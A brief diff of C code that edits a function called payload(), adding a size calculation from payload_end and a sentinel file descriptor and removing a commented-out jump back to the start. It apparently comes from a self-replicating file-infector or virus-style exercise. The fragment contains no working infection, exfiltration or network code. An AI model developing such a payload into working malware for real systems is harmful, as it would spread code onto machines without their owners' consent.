@@ -11,6 +11,8 @@ void payload()
 	t_data data;
 	int fd;
 
+	fd = 0xdeadbeaf;
+	data.infos.pl_size = &payload_end - &payload;
 	WRITE(1, "Payload length: ", 16);
 	ft_putnbr(&payload_end - &payload);
 	WRITE(1, "\n", 1);
@@ -23,7 +25,6 @@ void payload()
 		return ;
 	finder(data, fd);
 	CLOSE(fd);
-	//go_to_start();
 }
 
 void payload_end(void)
